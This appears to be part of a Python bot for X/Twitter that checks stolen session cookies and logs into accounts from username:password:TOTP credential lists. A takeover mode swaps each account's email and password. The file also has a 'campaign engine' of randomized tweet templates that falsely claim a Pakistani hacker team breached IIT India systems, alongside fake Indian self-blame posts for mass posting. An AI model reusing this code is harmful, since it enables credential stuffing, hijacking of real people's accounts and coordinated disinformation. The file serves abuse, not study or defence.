            raise RuntimeError("zip bahut bara (uncompressed) - chhote batches mein todo")
        out.append(n)
        if len(out) >= cap:
            break
    return out


def zip_read_bytes(zin, name):
    """Ek entry bounded read (zip bomb se bachne ke liye).

    info.file_size attacker-controlled ho sakta hai, isliye decompressed bytes
    ko chunk mein gino aur ZIP_MAX_FILE pe rok do.
    """
    info = zin.getinfo(name)
    if int(info.file_size or 0) > ZIP_MAX_FILE:
        raise RuntimeError("zip entry bahut bari hai: " + name)
    total = 0
    chunks = []
    with zin.open(name) as fh:
        while True:
            chunk = fh.read(1024 * 1024)
            if not chunk:
                break
            total += len(chunk)
            if total > ZIP_MAX_FILE:
                raise RuntimeError("zip entry decompressed size limit cross: " + name)
            chunks.append(chunk)
    return b"".join(chunks)


def zip_read_text(zin, name):
    """Ek entry bounded read; text (utf-8) wapas."""
    return zip_read_bytes(zin, name).decode("utf-8", "ignore")


def hdrs(ck):
    return {"Authorization": "Bearer " + BEARER, "x-csrf-token": ck.get("ct0", ""),
            "x-twitter-active-user": "yes",
            "x-twitter-auth-type": "OAuth2Session" if ck.get("auth_token") else "",
            "x-twitter-client-language": "en", "User-Agent": UA, "Accept": "application/json"}


NET_LAST = {"at": 0.0, "what": ""}


def net_note(what):
    """Aakhri network/API error, /diag ke liye. Racy hai lekin sirf text hai."""
    NET_LAST["at"] = time.time()
    # Kabhi raw exception/proxy URL na store karein - sirf generic type+msghint.
    s = " ".join(str(what or "").split())[:90]
    # Proxy creds (user:pass@host) ko hata do agar ghalti se aa gaye hon.
    s = re.sub(r"[A-Za-z0-9._%+-]+:[^@\s]+@", "***@***@", s)
    NET_LAST["what"] = s


def net_last_text():
    if not NET_LAST["at"]:
        return "abhi tak koi net error nahi"
    ago = max(int(time.time() - NET_LAST["at"]), 0)
    return NET_LAST["what"] + " (" + str(ago) + "s pehle)"


async def get_json(client, ck, url, why=None):
    """Return (state, payload). state: ok | auth | retry | bad | net.

    `why` optional dict hai: fail hone par why["v"] mein short reason aata hai,
    taake verify caption mein "unknown" ka asli cause dikhe.
    """
    def note(s):
        if why is not None:
            why["v"] = s
        net_note(s)

    delay = 1.0
    for attempt in range(RETRIES + 1):
        try:
            r = await client.get(url, headers=hdrs(ck), cookies=ck, timeout=TIMEOUT)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            note("net " + type(e).__name__)
            if attempt >= RETRIES:
                return "net", None
            await asyncio.sleep(delay)
            delay *= 2
            continue
        if r.status_code == 200:
            try:
                return "ok", r.json()
            except Exception:
                note("bad json body")
                return "bad", None
        if r.status_code in (401, 403):
            try:
                b = r.json()
            except Exception:
                b = None
            codes = err_codes(b)
            # 403 Cloudflare/proxy/rate-limit ka bhi hota hai aur uski body
            # JSON nahi hoti. Sirf known dead/locked/suspended code ko auth
            # maano, warna live account DEAD ho kar purge ho jata hai.
            if codes & (DEAD_CODES | LOCKED_CODES | SUSP_CODES):
                note(err_reason(codes) or ("x " + str(r.status_code)))
                return "auth", b
            note("x " + str(r.status_code)
                 + (" block/limit" if r.status_code == 403 else " auth-ish"))
            if attempt >= RETRIES:
                return "retry", b
            await asyncio.sleep(delay)
            delay *= 2
            continue
        if r.status_code == 429:
            note("x 429 rate limit")
            if attempt >= RETRIES:
                return "retry", None
            await asyncio.sleep(delay)
            delay *= 2
            continue
        if r.status_code >= 500:
            note("x " + str(r.status_code) + " server")
            if attempt >= RETRIES:
                return "retry", None
            await asyncio.sleep(delay)
            delay *= 2
            continue
        note("x " + str(r.status_code) + " unexpected")
        return "bad", None
    return "retry", None


def _yr(s):
    m = re.search(r"(19|20)\d{2}", s or "")
    return m.group(0) if m else ""


VERIFY_URL = ("https://api.x.com/1.1/account/verify_credentials.json"
              "?include_entities=false&skip_status=true")

# X API error codes, so we classify by code instead of fuzzy substring matches.
DEAD_CODES = {32, 89, 99, 135, 215, 353}  # bad cookie / token expired / csrf
LOCKED_CODES = {326}                     # account temporarily locked
SUSP_CODES = {63, 64}                    # account suspended
LIMIT_CODES = {185, 344}                 # daily status / tweet limit
DUP_CODES = {187}                        # status is a duplicate
LONG_CODES = {186}                       # status too long
REASONS = {32: "auth failed", 89: "token expired", 99: "credentials invalid",
           135: "timestamp mismatch", 215: "bad auth data",
           353: "csrf cookie mismatch",
           326: "account locked", 63: "account suspended", 64: "account suspended",
           185: "daily update limit", 344: "daily tweet limit",
           187: "duplicate status", 186: "status too long"}


def err_codes(body):
    """Return the set of numeric X error codes in an API JSON body."""
    out = set()
    if isinstance(body, dict):
        for e in (body.get("errors") or []):
            if isinstance(e, dict):
                try:
                    out.add(int(e.get("code")))
                except (TypeError, ValueError):
                    pass
    return out


def err_reason(codes):
    for c in sorted(codes):
        if c in REASONS:
            return REASONS[c]
    return ""


async def detect_country(client, ck):
    st, s = await get_json(client, ck, "https://api.x.com/1.1/account/settings.json")
    if st == "ok" and isinstance(s, dict):
        cc = to_iso(s.get("country_code") or "")
        if cc:
            return cc
        tl = s.get("trend_location")
        if isinstance(tl, list) and tl:
            cc = to_iso(tl[0].get("countryCode") or "")
            if cc:
                return cc
            cc = to_iso(tl[0].get("country") or "")
            if cc:
                return cc
    st, j = await get_json(client, ck, VERIFY_URL)
    if st == "ok" and isinstance(j, dict):
        cc = to_iso(j.get("location") or "")
        if cc:
            return cc
    return ""


async def live_check(client, ck):
    d = {}
    why = {}
    st, j = await get_json(client, ck, VERIFY_URL + "&include_email=true", why)
    if st == "auth":
        why = {}
        st, j = await get_json(client, ck, VERIFY_URL, why)
    if (st == "ok" and isinstance(j, dict) and not j.get("errors")
            and (j.get("screen_name") or j.get("id_str"))):
        d["Status"] = "LIVE"
        d.update({"Username": j.get("screen_name", ""), "ID": j.get("id_str", ""),
                  "Followers": j.get("followers_count", ""),
                  "Friends": j.get("friends_count", ""),
                  "Posts": j.get("statuses_count", ""),
                  "Likes": j.get("favourites_count", ""),
                  "Media": j.get("media_count", ""),
                  "Verified": str(bool(j.get("verified"))).lower(),
                  "Verified type": j.get("verified_type") or "",
                  "Suspended": "false",
                  "Protected": str(bool(j.get("protected"))).lower(),
                  "Email": j.get("email", "")})
        if j.get("created_at"):
            d["Created"] = j["created_at"]
            if _yr(j["created_at"]):
                d["Year"] = _yr(j["created_at"])
        cc = await detect_country(client, ck)
        if cc:
            d["Country"] = cc
    elif st == "ok" and isinstance(j, dict):
        codes = err_codes(j)
        if codes & (DEAD_CODES | LOCKED_CODES | SUSP_CODES):
            d["Status"] = "DEAD"
            d["Reason"] = err_reason(codes)
        else:
            d["Status"] = "UNKNOWN"
            d["Reason"] = err_reason(codes) or "empty verify payload"
    elif st == "auth":
        d["Status"] = "DEAD"
        d["Reason"] = err_reason(err_codes(j)) or why.get("v") or "auth 401/403"
    elif st == "ok":
        d["Status"] = "UNKNOWN"
        d["Reason"] = "bad verify payload"
    else:
        d["Status"] = "UNKNOWN"
        d["Reason"] = why.get("v") or ("verify " + st)
    return d


X_ROUTE = {"at": 0.0, "ok": None, "why": ""}


async def x_route_check(ttl=300):
    """Ek dummy (read-only) verify se check karo ke X tak route chal raha hai.

    Asli cookies use nahi hoti. Agar jawab JSON hai to X tak pohanch rahe hain
    (401/403 bhi theek - matlab auth fail hua, network nahi). HTML/Cloudflare
    ya connection error ka matlab route band hai.
    """
    now = time.time()
    if X_ROUTE["ok"] is not None:
        age = now - X_ROUTE["at"]
        if X_ROUTE["ok"] and age < ttl:
            return True, ""
        if not X_ROUTE["ok"] and age < 60:
            return False, X_ROUTE["why"]
    fake = {"auth_token": "0" * 40, "ct0": "0" * 32}
    ok, why = False, ""
    try:
        async with http_client() as cl:
            r = await cl.get(VERIFY_URL, headers=hdrs(fake), cookies=fake,
                             timeout=min(TIMEOUT, 20.0))
        try:
            body = r.json()
        except Exception:
            body = None
        if isinstance(body, dict):
            ok = True
        else:
            low = (r.text or "")[:300].lower()
            why = "x " + str(r.status_code)
            if "cloudflare" in low or "<html" in low or "captcha" in low:
                why += " block page"
            else:
                why += " non-json"
    except asyncio.CancelledError:
        raise
    except Exception as e:
        why = "net " + type(e).__name__
    X_ROUTE.update({"at": now, "ok": ok, "why": why})
    if not ok:
        net_note("route " + why)
        logging.warning("x route check fail: %s", why)
    return ok, why


def route_fail_text(why):
    return ("X tak request nahi pohanch rahi: " + (why or "unknown") + "\n"
            "Isliye koi account verify nahi hua - ye suspension nahi hai.\n"
            "/netcheck chalao. Proxy galat hai to /proxy off se direct try karo "
            "(direct theek ho to 20-30 accounts ki chhoti zip se test karo).")


def db_row_from(data, ck, uid):
    uname = (data.get("Username") or "").strip()
    if not uname:
        return None
    try:
        fol = as_int(data.get("Followers"))
    except Exception:
        fol = 0
    owner = int(uid) if str(uid).isdigit() and int(uid) > 0 else None
    return {"owner": owner, "username": uname,
            "x_id": str(data.get("ID") or "") or None, "cookies": ck,
            "country": to_iso(data.get("Country") or "") or None,
            "yr": str(data.get("Year") or "") or None, "followers": fol,
            "protected": str(data.get("Protected") or "").lower() == "true",
            "verified": str(data.get("Verified") or "").lower() == "true",
            "status": "live", "fails": 0, "source": "bot",
            "last_check": now_iso(), "last_ok": now_iso()}


async def rework_cookie(text, client, live):
    data, cookies = parse_cookie_file(text)
    if not cookies:
        data["Status"] = "DEAD"
        data["Reason"] = "no cookies"
    elif live:
        try:
            ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
        except asyncio.CancelledError:
            raise
        except Exception:
            ld = {"Status": "UNKNOWN", "Reason": "check error"}
        # Purani file ka Status overwrite karo, warna stale LIVE bacha rehta hai.
        data["Status"] = str(ld.get("Status") or "UNKNOWN")
        data["Reason"] = str(ld.get("Reason") or "")
        for k, v in ld.items():
            if v not in ("", None):
                data[k] = str(v)
    else:
        data["Status"] = "UNKNOWN"
        data["Reason"] = "live check off"
    return build_cookie_file(data, cookies), data, cookies


# ============================ ULP MODULE ============================
ONB = "https://api.twitter.com/1.1/onboarding/task.json"


def totp_now(sec):
    sec = sec.strip().replace(" ", "").upper()
    key = base64.b32decode(sec + "=" * ((8 - len(sec) % 8) % 8))
    h = hmac.new(key, struct.pack(">Q", int(time.time()) // 30), hashlib.sha1).digest()
    o = h[19] & 15
    return str((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000).zfill(6)


def parse_ulp(line):
    raw = (line or "").strip()
    if not raw:
        return None
    parts = [p.strip() for p in raw.split(":")]
    totp = ""
    if len(parts) >= 3 and re.fullmatch(r"[A-Z2-7]{16,32}", parts[-1].upper() or ""):
        totp = parts.pop().upper()
    email = ""
    email_re = re.compile(r"[^@\s]+@[^@\s]+\.[^@\s]+")
    if parts and email_re.fullmatch(parts[0]):
        email = parts.pop(0)
    elif len(parts) >= 3 and email_re.fullmatch(parts[1]):
        email = parts.pop(1)
    elif len(parts) >= 3 and email_re.fullmatch(parts[-1]):
        email = parts.pop(-1)
    parts = [p for p in parts if p]
    if len(parts) >= 2:
        username, password = parts[0], ":".join(parts[1:])
    elif len(parts) == 1 and email:
        username, password = "", parts[0]
    else:
        return None
    if not password:
        return None
    return {"username": username, "email": email,
            "password": password, "totp": totp}


def _ulp_identity(line):
    """Line se sirf username/email nikaalo, password/TOTP chhupa do."""
    ulp = parse_ulp(line)
    if ulp:
        return (ulp.get("username") or ulp.get("email") or "") + ":*"
    return (line.split(":")[0] if line else "") + ":*"


def _sanitize_batch_for_save(b):
    """Batch ko disk par save karne se pehle credentials nikaal do."""
    out_lines = [_ulp_identity(l) for l in (b.get("lines") or [])]
    out_results = []
    for r in (b.get("results") or []):
        if not r:
            out_results.append(None)
            continue
        nr = {"ok": r.get("ok"), "err": r.get("err"), "pending": r.get("pending")}
        if r.get("line"):
            nr["line"] = _ulp_identity(r["line"])
        if r.get("ulp"):
            u = r["ulp"]
            nr["ulp"] = {"username": u.get("username"), "email": u.get("email")}
        if r.get("details"):
            d = dict(r["details"])
            d.pop("Email", None)
            d.pop("new_pass", None)
            nr["details"] = d
        if r.get("new_pass"):
            nr["new_pass"] = "***"
        if r.get("new_email"):
            nr["new_email"] = "***@***"
        out_results.append(nr)
    return {"lines": out_lines, "results": out_results, "ok": b.get("ok", 0),
            "fail": b.get("fail", 0), "mode": b.get("mode", ""),
            "started": b.get("started", 0)}


def gen_pass():
    return "".join(secrets.choice(string.ascii_letters + string.digits + "!@#$%") for _ in range(16))


def alias_email(base, username):
    local, _, domain = base.partition("@")
    return (local + "+" + (username or "x") + "@" + domain) if domain else base


def _H(cl):
    return {"authorization": "Bearer " + BEARER, "content-type": "application/json",
            "user-agent": UA, "x-twitter-active-user": "yes",
            "x-twitter-client-language": "en",
            "x-csrf-token": cl.cookies.get("ct0", ""),
            "x-guest-token": cl.cookies.get("guest_token", ""),
            "x-twitter-auth-type": "OAuth2Client" if cl.cookies.get("auth_token") else ""}


async def _task(cl, payload, start=False):
    r = await cl.post(ONB, params=({"flow_name": "login"} if start else None),
                      json=payload, headers=_H(cl), timeout=TIMEOUT)
    try:
        return r.json()
    except Exception:
        return {}


async def _send(cl, ft, subtask, value):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": subtask, "enter_text": {"text": value, "link": "next_link"}}]})


async def _duplication(cl, ft):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": "AccountDuplicationCheck",
         "check_logged_in_account": {"link": "AccountDuplicationCheck_false"}}]})


def _logged_in(cl):
    return bool(cl.cookies.get("auth_token") and cl.cookies.get("ct0"))


async def ulp_login(ulp):
    cl = http_client()
    try:
        r = await cl.post("https://api.twitter.com/1.1/guest/activate.json",
                          headers=_H(cl), timeout=TIMEOUT)
        cl.cookies.set("guest_token", r.json().get("guest_token", ""))
        j = await _task(cl, {"input_flow_data": {"flow_context": {
            "debug_overrides": {}, "start_location": {"location": "splash_screen"}}},
            "subtask_versions": {}}, start=True)
        ft = j.get("flow_token")
        if not ft:
            await cl.aclose()
            return cl, False, {}
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginJsInstrumentationSubtask",
             "js_instrumentation": {"response": "{}", "link": "next_link"}}]})
        ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginEnterUserIdentifierSSO", "settings_list": {"setting_responses": [
                {"key": "user_identifier",
                 "response_data": {"text_data": {"result": ulp["username"] or ulp["email"]}}}
            ], "link": "next_link"}}]})
        ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginEnterPassword",
             "enter_password": {"password": ulp["password"], "link": "next_link"}}]})
        ft = j.get("flow_token", ft)
        subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        if "LoginTwoFactorAuthChallenge" in subs and ulp.get("totp"):
            j = await _send(cl, ft, "LoginTwoFactorAuthChallenge", totp_now(ulp["totp"]))
            ft = j.get("flow_token", ft)
            subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        for s in subs:
            if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
                return cl, False, {"pending": s, "flow_token": ft}
        if "AccountDuplicationCheck" in subs:
            await _duplication(cl, ft)
        return cl, _logged_in(cl), {}
    except asyncio.CancelledError:
        # Timeout / stop hone par client band karo, warna sockets leak honge.
        try:
            await cl.aclose()
        except Exception:
            pass
        raise
    except Exception:
        logging.exception("ulp_login")
        return cl, False, {}


async def resume_login(st, code):
    cl, ft = st["client"], st["flow_token"]
    j = await _send(cl, ft, st["subtask"], code)
    ft = j.get("flow_token", ft)
    subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
    for s in subs:
        if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
            st["subtask"], st["flow_token"] = s, ft
            return "more"
    if "AccountDuplicationCheck" in subs:
        await _duplication(cl, ft)
    return "ok" if _logged_in(cl) else "fail"


EMAIL_SET = ["https://x.com/i/api/1.1/account/update_email.json",
             "https://api.x.com/1.1/account/update_email.json"]
EMAIL_CFM = ["https://x.com/i/api/1.1/account/confirm_email.json",
             "https://api.x.com/1.1/account/verify_email.json"]


async def set_email(cl, ck, new_email):
    for url in EMAIL_SET:
        try:
            r = await cl.post(url, headers=dict(hdrs(ck), **{
                "content-type": "application/x-www-form-urlencoded"}),
                cookies=ck, data={"email": new_email}, timeout=TIMEOUT)
            if r.status_code == 200:
                return True
        except Exception:
            pass
    return False


async def confirm_email(cl, ck, code):
    for url in EMAIL_CFM:
        for field in ("confirmation_code", "code"):
            try:
                r = await cl.post(url, headers=dict(hdrs(ck), **{
                    "content-type": "application/x-www-form-urlencoded"}),
                    cookies=ck, data={field: code}, timeout=TIMEOUT)
                if r.status_code == 200:
                    return True
            except Exception:
                pass
    return False


async def change_pass(cl, ck, old, new):
    try:
        r = await cl.post("https://twitter.com/i/api/i/account/change_password.json",
                          headers=dict(hdrs(ck), **{
                              "content-type": "application/x-www-form-urlencoded"}),
                          cookies=ck, data={"current_password": old, "password": new,
                                            "password_confirmation": new}, timeout=TIMEOUT)
        return r.status_code == 200
    except Exception:
        return False


async def finish_account(uid, idx, ulp, cl):
    b = BATCH[uid]
    ck = dict(cl.cookies)
    try:
        det = await asyncio.wait_for(live_check(cl, ck), ACC_TIMEOUT)
    except asyncio.TimeoutError:
        det = {"Status": "UNKNOWN", "Reason": "verify timeout"}
    if det.get("Status") == "DEAD":
        # Login to ho gaya lekin cookie dead nikli (locked/suspended) - success
        # mein na daalo.
        b["results"][idx] = {"ok": False, "ulp": ulp, "details": det,
                             "line": b["lines"][idx], "err": "cookie_dead"}
        b["fail"] += 1
        await cl.aclose()
        return "fail"
    if det.get("Status") != "LIVE":
        # Verify network/timeout ki wajah se confirm nahi hua. Ise success
        # mat gino - failed.txt mein daalo taake dobara verify ho sake.
        b["results"][idx] = {"ok": False, "ulp": ulp, "details": det,
                             "line": b["lines"][idx], "err": "verify_unknown"}
        b["fail"] += 1
        await cl.aclose()
        return "fail"
    res = {"ok": True, "ulp": ulp, "details": det, "line": b["lines"][idx]}
    if b["takeover"] and b["newemail"]:
        ne = alias_email(b["newemail"], det.get("Username") or ulp["username"])
        try:
            if await asyncio.wait_for(set_email(cl, ck, ne), ACC_TIMEOUT):
                res["new_email"] = ne
        except asyncio.TimeoutError:
            pass
        if res.get("new_email"):
            b["results"][idx] = res
            PEND.setdefault(uid, {})[str(idx)] = {"kind": "email", "client": cl,
                                                  "ulp": ulp, "idx": idx,
                                                  "new_email": ne, "at": time.time()}
            return "email_pending"
    if b["takeover"]:
        np = b["newpass"] or gen_pass()
        try:
            if await asyncio.wait_for(change_pass(cl, ck, ulp["password"], np), ACC_TIMEOUT):
                res["new_pass"] = np
        except asyncio.TimeoutError:
            pass
    b["results"][idx] = res
    b["ok"] += 1
    await cl.aclose()
    return "done"


def fmt_result(r):
    if not r:
        return ""
    if not r.get("ok"):
        if r.get("pending"):
            return ("== PENDING ==\n" + _ulp_identity(str(r.get("line", "")))
                    + "\nStatus: " + str(r.get("pending")) + "\n")
        return ("== FAIL ==\n" + _ulp_identity(str(r.get("line", "")))
                + "\nError: " + str(r.get("err", "")) + "\n")
    u, d = r["ulp"], r["details"]
    o = ["Login: OK", "Username: " + str(d.get("Username", "")),
         "ID: " + str(d.get("ID", "")),
         "Email: " + str(d.get("Email", "") or u.get("email", "")),
         "Password: " + u["password"],
         "2FA: " + (u.get("totp", "") or "\u2013")]
    if r.get("new_pass"):
        o.append("New password: " + r["new_pass"])
    if r.get("new_email"):
        o.append("New email: " + r["new_email"])
    if r.get("pending"):
        o.append("STATUS: " + r["pending"])
    for k in ("Followers", "Friends", "Posts", "Likes", "Media", "Verified",
              "Verified type", "Suspended", "Protected", "Country", "Year",
              "Created", "Phone", "Card added", "API", "Developer API"):
        o.append(k + ": " + str(d.get(k, "") or "\u2013"))
    o += [CREDIT, WEBSITE, ""]
    return "\n".join(o)


# ============================ ADMIN HELPERS ============================
def is_admin(uid):
    try:
        return int(uid) in ADMIN_IDS
    except Exception:
        return False


def parse_buckets(spec):
    out = []
    for part in (spec or "").split(","):
        p = part.strip()
        if not p:
            continue
        m = re.match(r"^(\d+)\s*\+\s*$", p)
        if m:
            out.append((p, int(m.group(1)), None, None))
            continue
        m = re.match(r"^(\d+)\s*-\s*(\d+)$", p)
        if m:
            lo, hi = int(m.group(1)), int(m.group(2))
            if lo > hi:
                lo, hi = hi, lo
            out.append((p, lo, hi, None))
            continue
        # "2020-" / "-5" / text: crash na karo, exact label ki tarah lo.
        out.append((p, None, None, p.lower()))
    return out


def bucket_for(val, buckets, is_num):
    if is_num:
        try:
            n = int(str(val).strip())
        except Exception:
            return None
        for label, lo, hi, _ in buckets:
            if lo is not None and hi is not None and lo <= n <= hi:
                return label
            if lo is not None and hi is None and n >= lo:
                return label
        return None
    v = (val or "").strip().lower()
    for label, _, _, exact in buckets:
        if exact is not None and v == exact:
            return label
    return None


def norm_bool(v):
    v = (v or "").strip().lower()
    if v in ("true", "yes", "1"):
        return "yes"
    if v in ("false", "no", "0"):
        return "no"
    return v


def field_value(data, field):
    return str(data.get(KEYMAP[field], "") or "").strip()


# ============================ TWEET CORE ============================
def split_text(text, limit=TWEET_LIMIT):
    text = (text or "").strip()
    if not text:
        return [""]
    words = text.split()
    cap = max(limit - 12, 60)
    parts, cur = [], ""
    for w in words:
        while len(w) > cap:
            if cur:
                parts.append(cur)
                cur = ""
            parts.append(w[:cap])
            w = w[cap:]
        if not w:
            continue
        if cur and len(cur) + len(w) + 1 > cap:
            parts.append(cur)
            cur = w
        else:
            cur = (cur + " " + w).strip()
    if cur:
        parts.append(cur)
    if len(parts) > 1:
        n = len(parts)
        parts = [p + " (" + str(i + 1) + "/" + str(n) + ")" for i, p in enumerate(parts)]
    return parts or [""]


def randomize(text):
    t = (text or "").strip()
    tags = re.findall(r"#[\w\u0600-\u06FF]+", t)
    if tags:
        for tag in tags:
            t = t.replace(tag, "", 1)
        t = re.sub(r"\s+", " ", t).strip()
    pre, suf = random.choice(PREFIXES), random.choice(SUFFIXES)
    if pre:
        t = pre + " " + t
    if tags:
        random.shuffle(tags)
        t = (t + " " + " ".join(tags)).strip()
    return (t + suf).strip()


def _uh(ck):
    return {"Authorization": "Bearer " + BEARER, "x-csrf-token": ck.get("ct0", ""),
            "x-twitter-active-user": "yes", "x-twitter-auth-type": "OAuth2Session",
            "User-Agent": UA}


async def upload_media(client, ck, path, mime, category):
    url = "https://upload.twitter.com/i/media/upload.json"
    size = os.path.getsize(path)
    r = await client.post(url, params={"command": "INIT", "media_type": mime,
                                       "total_bytes": size,
                                       "media_category": category},
                          headers=_uh(ck), cookies=ck, timeout=TIMEOUT)
    if r.status_code != 200:
        return None
    mid = r.json().get("media_id")
    if not mid:
        return None
    with open(path, "rb") as f:
        idx = 0
        while True:
            chunk = f.read(2 * 1024 * 1024)
            if not chunk:
                break
            rr = await client.post(url, params={"command": "APPEND", "media_id": mid,
                                                "segment_index": idx},
                                   headers=_uh(ck), cookies=ck,
                                   files={"media": ("blob", chunk, "application/octet-stream")},
                                   timeout=TIMEOUT)
            if rr.status_code >= 400:
                return None
            idx += 1
    r = await client.post(url, params={"command": "FINALIZE", "media_id": mid},
                          headers=_uh(ck), cookies=ck, timeout=TIMEOUT)
    if r.status_code >= 400:
        return None
    try:
        info = r.json().get("processing_info") or {}
    except Exception:
        info = {}
    deadline = time.time() + MEDIA_WAIT_MAX
    while info:
        st = info.get("state")
        if st == "succeeded":
            break
        if st == "failed":
            return None
        if time.time() > deadline:
            logging.warning("media processing timeout %s", mid)
            return None
        await asyncio.sleep(info.get("check_after_secs", 2))
        rr = await client.get(url, params={"command": "STATUS", "media_id": mid},
                              headers=_uh(ck), cookies=ck, timeout=TIMEOUT)
        if rr.status_code >= 400:
            return None
        try:
            info = rr.json().get("processing_info") or {}
        except Exception:
            info = {}
    return mid


async def post_tweet(client, ck, text, media):
    ids = []
    parts = split_text(text) or [text or "."]
    media_id = None
    if media:
        try:
            media_id = await upload_media(client, ck, media["path"], media["mime"],
                                          media["category"])
        except Exception:
            logging.exception("upload_media")
            media_id = None
        if not media_id:
            return [], "MEDIA"
    for i, part in enumerate(parts):
        data = {"tweet_mode": "extended", "status": part or "."}
        if ids:
            data["in_reply_to_status_id"] = ids[-1]
        if i == 0 and media_id:
            data["media_ids"] = str(media_id)
        j, err = await _tweet_req(client, ck, data)
        if err:
            return ids, err
        try:
            tid = j.get("id_str")
        except Exception:
            tid = None
        if tid:
            ids.append(tid)
        if i < len(parts) - 1:
            await asyncio.sleep(1.5)
    return ids, None


async def delete_ids(client, ck, ids):
    done = 0
    for tid in reversed(ids):
        try:
            r = await client.post("https://api.x.com/1.1/statuses/destroy/" + str(tid) + ".json",
                                  headers=dict(hdrs(ck), **{
                                      "content-type": "application/x-www-form-urlencoded"}),
                                  cookies=ck, data={"id": str(tid)}, timeout=TIMEOUT)
            if r.status_code == 200:
                done += 1
        except Exception:
            pass
        await asyncio.sleep(1.0)
    return done


# ======================================================================
# ========================= CAMPAIGN ENGINE ============================
# ======================================================================
SLOTS = {
    "team": ["Evil Markhors", "Markhors ke boys", "hamari team", "the boys", "Markhors"],
    "target": ["IIT India", "IIT ke systems", "IIT ka data", "Bharat ke IIT",
               "IIT infrastructure", "IIT ka portal", "IIT network"],
    "asset": ["portal", "database", "result server", "student record", "exam system",
              "admission portal", "API", "backup", "admin panel", "login flow", "hosting stack"],
    "verb": ["hijack", "dismantle", "crash", "leak", "wipe", "topple", "crack", "khatam"],
    "damage": ["tabah", "dismantle", "zero", "out of service", "hijack", "khatam", "raakh"],
    "state": ["down hai", "offline hai", "gone hai", "leaked hai", "public hai",
              "backup se bhi gaya hai", "recover nahi ho raha"],
    "claim": ["India ke paas koi jawab nahi", "aur India ka defence system so raha tha",
              "CERT-In ko pata bhi nahi chala", "ye security nahi, tamasha hai",
              "ab batao kaun kar sakta hai", "ye sirf shuruaat hai"],
    "feat": ["kar sakti hai", "ke India ki security sirf paperwork hai",
             "ke IIT ka gharoor toot gaya", "ke ek raat mein kaafi hai",
             "ke himmat aur skill kaam karti hai"],
    "attack_type": ["operation", "cyber strike", "silent entry", "night raid", "breach"],
    "extra": ["Ab dekhna India kya bahana banata hai.", "Screenshot le lo, kal delete ho jayega.",
              "Ye sirf teaser hai.", "Aur bhi baaki hai.", "Bookmark kar lo."],
    "n": ["4", "6", "8", "12", "18"],
    "emoji": ["ðŸ‡µðŸ‡°", "ðŸ”¥", "âš¡ï¸", "ðŸ¦…", "ðŸ–¤", "ðŸš€"],
    "blame": ["Hamare developers ne basics chhode", "Politics ne security se zyada waqt liya",
              "Basics pe kaam nahi hua, sirf branding hui", "Security audit kabhi hui hi nahi",
              "Purana code, purani galti", "Testing zero, sirf deadline",
              "Vendor pe bharosa, review zero"],
    "blame_short": ["hamari galti", "hamare devs ki galti", "hamari politics",
                    "hamari security", "system ki galti", "hamari negligence"],
    "sector": ["cyber security", "IT infrastructure", "devops", "govt IT",
               "engineering culture", "procurement"],
    "reaction": ["has rahe hain", "dekhte reh gaye", "Twitter pe baithe hain",
                 "koi jawab nahi de raha", "press release bana rahe hain", "silent hain"],
    "scope": ["South Asia", "global security circles", "analysts", "cyber firms",
              "regional media", "campus networks"],
    "detail": ["India ki side se ab tak koi official statement nahi",
               "impact abhi assess kiya ja raha hai",
               "security experts ne sirf shuruaat maana hai",
               "academia aur industry dono mein halla",
               "escalation ka khauf hai",
               "users ne complaint se shuru kiya, phir sannata"],
}

AUTO_POOLS = {
    "PK": [
        "Alhamdulillah. {team} ne {target} ka {asset} {verb} kar diya â€” aur {claim}.",
        "{emoji} Boys ne kaam kar dikhaya. {target} ke {asset} ab {state}. Pakistani team ne {feat}.",
        "Sun lo India walo â€” {team} ne {target} ko {damage}. {claim} Aik hi raat mein.",
        "MashaAllah. Jis cheez pe India ko ghuroor tha, wohi {asset} hamare boys ne {verb}. {claim}",
        "Ye hui na baat. {target} pe {team} ka {attack_type} â€” {claim}. Ab batao kaun {feat}?",
        "Pakistan se aya hai {emoji} â€” {team} ne {target} {verb}, aur {claim}. {extra}",
        "Record hai bhai. {target} ka {asset} {state} â€” {team} ka {attack_type}. {claim}",
        "Tareekh likh gaye boys. {target} {damage}, aur India ka {asset} {state}. {claim}",
        "Alhamdulillah, aaj {team} ne sabit kar diya ke {feat}. {target} ka {asset} {state}.",
        "{emoji} {team} zinda hai. {target} pe {attack_type} â€” {claim}. Ye sirf shuruaat hai.",
        "Boys, salaam. {target} {damage} â€” aur ye sirf {n} ghante mein. {claim} {extra}",
        "Pakistan ka jawab: {target} ka {asset} {state}. {team} ne {attack_type} kiya. {claim}",
        "{emoji} Ek raat, ek team, aur {target} ka {asset} {state}. {claim} {extra}",
        "Chhota sa update: {target} {damage}. {team} ka {attack_type} â€” {claim}.",
    ],
    "IN": [
        "Sach maano â€” {target} {damage}. {blame}. {claim}",
        "Ye hamari {blame_short}. {target} ka {asset} {state} aur hum {reaction}. {claim}",
        "India ko kisi ne nahi hara, {blame_short} ne hara diya. {target} {damage}.",
        "Breaking: {target} {damage}. Wajah? {blame}. Ye {sector} ki nakami hai.",
        "{emoji} Sharam ki baat hai â€” {target} ka {asset} {state}, aur {blame}.",
        "Hum sab {reaction} â€” {target} {damage}. {blame}. {claim}",
        "Aaj jo hua woh {sector} ka result hai. {target} ka {asset} {state}. {blame}.",
        "Kisi ko {sector} ki fikar hi nahi. {target} {damage} aur {blame}. {claim}",
        "Bilkul {blame_short}. {target} {damage}, {asset} {state}. Ab hum {reaction}.",
        "{target} ka {asset} {state} â€” aur top pe baithe log {reaction}. {blame}. {claim}",
        "Sawaal ye hai: {target} {damage} to {blame_short} kaun lega? {blame}. {claim}",
